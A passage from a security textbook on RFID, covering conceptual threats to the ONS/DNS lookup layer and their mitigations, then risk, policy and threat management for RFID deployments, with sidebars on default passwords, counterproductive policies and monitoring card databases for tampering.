endpoints pertaining to the EPC in question. ONS does not contain actual data regarding 
the EPC; it only contains the network address of services that contain the actual data. This 
information should not be stored on the tag itself; the distributed servers in the Internet 
should supply the information. ONS and EPC help locate the available data regarding the 
particular object.
Known Threats to DNS/ONS
Since ONS is a subset of Domain Name Server (DNS), all of the threats to the DNS also 
apply to ONS. There are several distinct classes of threats to the DNS, most of which are 
DNS-related instances of general problems; however, some are speciﬁ c to peculiarities of 
the DNS protocol.

 
RFID Security: Attacking the Backend • Chapter 15 
319
■ 
Packet Interception - Manipulating Internet Protocol (IP) packets carrying 
DNS information Includes MIM attacks and eavesdropping on request, combined 
with spoofed responses that modify the “real” response back to the resolver. In any 
of these scenarios, the attacker can tell either party (usually the resolver) whatever it 
wants them to believe.
■ 
Query Prediction Manipulating the Query/Answer Schemes of the User 
Datagram Protocol (UDP)/IP Protocol These ID guessing attacks are mostly 
successful when the victim is in a known state.
■ 
Name Chaining or Cache Poisoning Injecting manipulated information into 
DNS caches.
■ 
Betrayal by Trusted Server Attackers controlling DNS servers in use.
■ 
Denial of Service (DOS) DNS is vulnerable to DOS attacks. DNS servers are 
also at risk of being used as a DOS ampliﬁ er to attack third parties
■ 
Authenticated Denial of Domain Names
ONS and Conﬁ dentiality
There may be cases where the Electronic Product Code (EPC) of an RFID tag is regarded as 
highly sensitive information. Even if the connections to EPCIS servers were secured using 
Secure Sockets Layer (SSL)/Transport Layer Security (TLS), the initial ONS look-up process 
was not authenticated or encrypted in the ﬁ rst place. The DNS-encoded main part of the 
EPC, which identiﬁ es the asset categories, will traverse every network between the middleware 
and a possible local DNS server in clear text and is susceptible to network taps placed by 
Internet Service Provider’s (ISPs) and governmental organizations.
ONS and Integrity
Integrity refers to the correctness and completeness of the returned information. An 
attacker controlling intermediate DNS servers or launching a successful MIM attack on 
the communication, could forge the returned list of Uniform Resource Identiﬁ ers (URIs). 
If no sufﬁ cient authentication measures for the EPCIS are in place, the attacker could 
deliver forged information about this or related EPCs from a similar domain.
ONS and Authorization
Authorization refers to protecting computer resources by only allowing the resources to 
be used by those that have been granted the authority. Without authorization, a remote 
attacker can do a brute-force attack to query the corresponding EPCIS servers until a match 
is found. In case the complete serial number is not known, the class identiﬁ er of the EPC 

320 
Chapter 15 • RFID Security: Attacking the Backend
may be enough to determine the kind of object it belongs to. If using the EPCglobal net-
work becomes ubiquitous and widespread, the attacker could add fake serial numbers to the 
captured, incomplete EPC and query the corresponding EPCIS servers to ﬁ nd a match. 
This can be used to identify assets of an entity, be it an individual, a household, a company, 
or any other organization. If you wore a rare item or a rare combination of items, tracking 
you could be accomplished just by using the object classes.
ONS and Authentication
Authentication refers to identifying the remote user and ensuring that he or she is who they 
say they are.
Mitigation Attempts
■ 
Limit Usage Use the ONS only in intranet and disallowing any external queries
■ 
VPN or SSL Tunneling With data traveling between the remote sites, it needs 
to be exchanged over an encrypted channel like VPN or SSL Tunneling
■ 
DNS Security Extensions (DNSSEC) ensure the authenticity and integrity of DNS. 
This can be done using Transaction Signatures (TSIG) or asymmetric cryptography 
with Rivest, Shamir, & Adleman (RSA) and digital signature algorithms (DSAs). 
The TSIG key consists of a secret (a string) and a hashing algorithm. By having the 
same key on two different DNS servers, they can communicate securely to the 
extent that both servers trust each other. DNSSEC needs to be widely adopted by 
the Internet community to assure ONS information integrity.

Summary
The true beneﬁ ts of RFID technology can be reaped if RFID events give real-time visibility 
to the business processes either already in place or to new ones. The backend systems give a 
business context to the RFID events collected from the RFID data collection tools and then 
invokes the right business process in real time (or near real time). Protecting the backend 
system is vital from the various security threats at the network level (attacking ONS or 
network communication between data collection tool and backend system) or at the data 
level (spurious events). The network level attacks can be prevented by using secured 
communications between various processes. The data attacks are hard to deal with and 
application designers must take special care to differentiate spurious events from good events 
and then act on the good ones almost in real time. Since data is collected using automated 
data collection techniques, application designers must clean the repository where good 
RFID events are stored.

Chapter 16 • Management of RFID Security
Introduction
While sitting at your desk one morning, your boss walks in and announces that the 
company is switching to a new Radio Frequency Identiﬁ cation (RFID) setup for tracking 
products, which will add new equipment to the network and make it more secure. Your boss 
expects you to evaluate the new RFID equipment and devise an appropriate security plan.
The ﬁ rst thing you need to do is determine your security needs. You may be a position 
to inﬂ uence the evaluations and purchasing of RFID applications and equipment; however, 
more than likely, you will be given a ﬁ xed set of parameters for applications and equipment.
In either case, the ﬁ rst thing you need to do is assess the vulnerabilities of the proposed 
RFID system. After you have assessed the RFID system it in detail, you can devise plans on 
how to manage system security.
Risk and Vulnerability Assessment
The assessment of risks and vulnerabilities go hand in hand. You have to make sure the obvi-
ous things are covered.
To begin evaluating your system, you need to ask questions regarding the assessment and 
tolerance of the risks: what types of information are you talking about at any given point in 
the system and what form is it in? How much of that information can potentially be lost? 
Will it be lost through the radio portion of the system, someplace in the middleware, or at 
the backend? Once these risks are evaluated, you can begin to plan how to secure it.
A good way to evaluate the risk is to ask the newspaper reporter’s ﬁ ve classic investigative 
questions: “who?,” “what?,” “when?,” “where?,” and “how?”
■ 
Who is going to conduct the attack or beneﬁ t from it? Will it be a competitor or 
an unknown group of criminals?
■ 
What do they hope to gain from the attack? Are they trying to steal a competi-
tor’s trade secret? If it is a criminal enterprise, are they seeking customers’ credit 
card numbers?
■ 
When  will the attack happen? When a business is open 24 hours a day, 7 days a 
week, it is easy to forget that attacks can occur when you are not there. If a business 
is not open 24 hours per day, some of the infrastructure (e.g., readers) may still be 
on during off-business hours and vulnerable to attack.
■ 
Where will it take place? Will the attack occur at your company’s headquarters or 
at an outlying satellite operation? Is the communications link provided by a third 
party vulnerable?
■ 
How will they attack? If they attack the readers via a RF vulnerability, you need 
to limit how far the RF waves travel from the reader. If the attacker is going after 

 
Management of RFID Security • Chapter 16

a known vulnerability in the encryption used in the tag reader communications, 
you have to change the encryption type, and, therefore, also change all of the tags.
Asking these questions can help you focus and determine the risks of protecting your 
system and data.
The US military uses the phrase “hardening the target,” which means designing a potential 
target such as a command bunker or missile silo to take hits from the enemy. The concept of 
hardening a target against an attack in the Information Technology (IT) sector is also valid, and 
further translates into the RFID area.
Basically, hardening the target means considering the types of speciﬁ c attacks that can be 
brought against speciﬁ c targets. When securing RFID systems, speciﬁ c targets have speciﬁ c 
attacks thrown at them.
Consider the following scenario. A warehouse has a palette tracking system where an 
RFID reader is mounted on a gantry over a conveyor belt. As pallets pass down the conveyor 
belt, they pass through the gantry, the reader’s antennas activate the tags on each pallet, the 
tags are read, and the reader passes the information to the backend database.
In this situation, if you are concerned about potential attackers gleaning information from 
the radio waves emitted by the RFID reader station and the tags, you should harden it by 
limiting the RF waves from traveling beyond the immediate area of the reader. The easiest 
way is to lower the transmit power of the reader to the absolute minimum for triggering the 
tags. If that solution does not work or is not available, other options may include changing 
the position or orientation of the reader’s antennas on the gantry, or constructing a Faraday 
cage around the reader. (A Faraday cage is an enclosure designed to prevent RF signals from 
entering or exiting an area, usually made from brass screen or some other ﬁ ne metallic mesh.)
Consider whether other issues with the tags might cause problems. Is there is a repetition 
level for information hard coded into the tags? If using the codes for proximity entry control 
combined with a traditional key (e.g., in the Texas Instruments DST used with Ford car 
keys), a repeat of the serial numbers every 10,000 keys may be an acceptable risk. However, 
if it is being used as a pallet counting system, where 2000 pallets are processed daily, the same 
numbers will be repeated weekly, which may pose the risk of placing a rogue tag into a 
counting system. In this case, repeating a serial number every 10,000 times is probably not 
acceptable for that business model.
If you are concerned about attacks among the middleware and information being 
intercepted by an attacker, make sure that the reader’s electronics or communications lines 
are not open to those who should not have access to them. In this case, hardening the target 
may be as simple as placing equipment (e.g., Ethernet switches) in locked communications 
closets, or performing a source code software review to ensure that an overloading buffer 
does not crash the reader.
Finally, hardening the target for the backend means preventing an attack on the database. 
In this regard, the security of a new RFID system should not cause anything new to a 

326 
Chapter 16 • Management of RFID Security
security professional, with the possible exception of a new attack vector in the form of a 
new communications channel.
A new channel may provide a challenge for securing previously unused Transmission 
Control Protocol (TCP) ports in the backend, by reexamining the database for the possibility 
of Structured Query Language (SQL) injection attacks. However, nothing at the backend 
is new to seasoned security professionals; therefore, standard risk evaluation practices for 
backend systems should prevail.
Notes from the Underground…
Defaults Settings: Change Them!
Default passwords and other default security settings should be changed as soon as 
possible. This bears repeating, because many people do not make the effort to change 
their defaults.
You may think that your Acme Super RFID Reader 3000 is protected simply 
because no one else owns one; however, default settings are usually well known by 
the time new equipment is placed on the market. Most manufacturers place manuals 
on their Web sites in the form of either Web pages or Adobe Portable Document 
Format (PDF) ﬁ les. Other Web sites contain pages full of default settings, ranging from 
unofﬁ cial tech support sites to sites frequented by criminals intent on cracking other 
people’s security.
To learn how much of this information is available, type the name and model of 
a given device into your favorite search engine, followed by the words “default” and 
“passwords.”
When evaluating the risks and vulnerabilities, the bottom line is this: Once you have 
determined the point of an attack and how it happened, you can decide what options are 
available for mitigating the attack. When these options are identiﬁ ed, you can begin formulating 
the management and policies that will hopefully minimize your exposure to an attack.
Risk Management
Once the risks and vulnerabilities are identiﬁ ed, begin managing the risks. Start by validating 
all of your equipment, beginning with the RFID systems and working down to the backend. 
At each stage, you should observe how a particular item works (both individually and in 
combination with other items), and how it ﬁ ts into your proposed security model.

 
Management of RFID Security • Chapter 16 
327
Let’s look back at the warehouse example. A 900 MHz RFID tag is needed for tracking, 
because its RF properties work with the materials and products that are tracked to the 
warehouse. You need to decide if those same RF properties will cause a disruption in the 
security model. Will the 900 MHz signal travel further than expected compared to other 
frequencies? Can the signals be sniffed from the street in front of the warehouse? Managing 
this potential problem can be as simple as changing to a frequency with a shorter range, or 
as complicated as looking at other equipment with different capabilities.
Middleware management ensures that ensuing data is valid as it moves through the system. 
Receiving a text string instead of a numeric stock number may indicate that an attacker is 
attempting to inject a rogue tag command into the system. Checksums are also a common 
way to verify data, and may be required as part of the ongoing need to ensure that the data 
traveling through middleware applications is valid.
Managing middleware security usually involves using encryption to secure data, in which 
case, you need to consider the lifespan of the information in light of how long it would take 
an attacker to break the encryption. If your information becomes outdated within a week 
(e.g., shipment delivery information), it will probably take an attacker six months to break 
the encryption scheme. However, do not forget that increases in computing power and new 
encryption cracking techniques continually evolve. A strong encryption technique today, may 
be a weak encryption tomorrow.
Managing a system also involves establishing policies for the users of that system. You can 
have the most secure encryption used today, but if passwords are posted on monitors, security 
becomes impossible. Make sure that the policies are realistic, and that they do not defeat 
security instead of enhancing it.

Notes from the Underground…
Bad Policies May Unintentionally Inﬂ uence Security
Do not assume that RFID security is just about databases, middleware, and radio 
transmissions. Policy decisions also have an impact on the security of an RFID system. 
Bad policies can increase risks (e.g., not patching a server against a known 
vulnerability).
In other areas, bad policies can directly affect security without being obvious. 
One state agency uses proximity cards as physical access control to enter its building 
and to enter different rooms within the building. Like most of these types of systems, 
the card number is associated with the database containing the cardholder’s name

328 
Chapter 16 • Management of RFID Security
and the areas they are allowed to access. When the cardholder passes the card over 
the reader antenna associated with each door, the system looks in the database and 
makes a decision based on the privileges associated with that card.
Proximity cards are issued when an employee begins a new job, and are collected 
when the employee leaves the company. At this particular agency, the personnel 
department is responsible for issuing and collecting cards. Therefore, they implemented 
a policy that imposes a ﬁ ne on employees that lose their card.
In one case, an employee lost a card, but did not report it to his superiors because 
he did not want to pay a ﬁ ne. As a relatively low-level employee, reporting the loss 
and paying the ﬁ ne would create a ﬁ nancial hardship.
The proximity card is the least costly part of the RFID-controlled entry system. 
However, because of a policy designed to discourage losing the cards, the entire build-
ing security could easily be compromised if someone found that particular card. The 
goal of securing physical access to the building was forgotten when the cost of the 
card replacement began to drive the policy. The people who wrote the policy assumed 
that if an employee lost a card, they would pay the ﬁ ne.
At another agency, the people using the system issue the cards and control 
physical access to the building, taking great effort to password-protect the workstations 
that access the database. However, sometimes they forget to physically protect the 
control system. The RS-232 serial ports that directly control the system and the cables 
to each controlled door, are accessible by anyone who wanders into the room. The 
room itself is accessible via an unlocked door to a room where visitors are allowed to 
roam unescorted.
This particular agency lacks policies regarding installing security equipment, the 
areas to secure, and the inability to fully understand the system, which all add up to 
a potential failure.
Review your policies and keep focused on the goal. Remember to asked questions 
like, “Are we trying to secure a building, or are we concerned about buying new 
cards?” “Are we leaving parts of a system vulnerable just because they are out of 
sight?” “Will people follow or evade this policy?”
Threat Management
When conducting threat management for RFID systems, monitor everything, which will 
help with any difﬁ culties.
If you are performing information security, you may be overwhelmed by the large 
amount of data and communications that must be monitored. As a matter of routine, you 
should conﬁ rm the integrity of your systems via login access and Dynamic Host 
Conﬁ guration Protocol (DHCP) logs, and perform physical checks to make sure that new 
devices are not being added to the network without your knowledge.
Adding RFID systems to the list of systems to be monitored will increase the difﬁ culty. 
In addition to physically checking the Ethernet connections, you will also have to perform 
RF sweeps for devices attempting to spoof tags, and keep an eye out for people with RF 
equipment who may attempt to sniff data from the airways.

 
Management of RFID Security • Chapter 16 
329
Continued
You will need new equipment and training for the radio side of the system, since radio 
systems are usually outside the experience of most network professionals. You will also have 
new middleware connections that will add new channels, thus, introducing possible new 
threats and adding new vectors for the more routine threats such as computer viruses and 
spyware.
Notes from the Underground…
Monitoring Isn’t Just for Logs
Monitoring and tracking changes in ﬁ les rather than logs is just as important. For 
example, suppose you have a program with the following RFID proximity cards and 
associated names:
Card1 DATA “8758176245”
Card2 DATA “4586538624”
Card3 DATA “7524985246”
Name1 DATA “George W. Bush”, CR, 0
Name2 DATA “Dick Cheney”, CR, 0
Name3 DATA “Condoleeza Rice”, CR, 0
…
LOOKUP tagNum, [Name1, Name2, Name3]
If we make three small additions, if becomes easy to add a previously unauthorized 
user.
Card1 DATA “8758176245”
Card2 DATA “4586538624”
Card3 DATA “7524985246”
Card4 DATA “6571204348” ‘

Chapter 16 • Management of RFID Security
With the addition of 63 bytes of data, the security of this RFID card access system 
has been compromised. However, an increase of 63 bytes of data might not be noticed 
in a large database of cards comprising thousands of users.
Remember to periodically review the contents of databases with those people 
who know what the contents should be. Do not assume that all of data is valid.

When you are done securing your new RFID system and you think you have all the 
threats under control, go back to the beginning and start looking for new vulnerabilities, 
new risks, and new attacks. As previously mentioned, things such as increases in computing 
power and new encryption cracking techniques are constantly evolving, and may break a 
security model in short order. Keeping up with new security problems and the latest attack 
methods is an ongoing process; one that demands constant vigilance.

Summary
With new technologies, we are often seduced by the grand vision of what “it” promises. 
Currently, RFID is one of the newest technologies offering this a grand vision. While RFID 
holds great promise in many applications, the last several years have proven that many aspects 
of RFID systems are insecure and new vulnerabilities are found daily.
The driving idea behind RFID Security is applying Information Security (InfoSec) 
principles to RFID applications. What we [the author’s] have attempted to do is show you 
some common pitfalls and their solutions, and get you started thinking about the security 
implications of installing and running an RFID system in your organization.
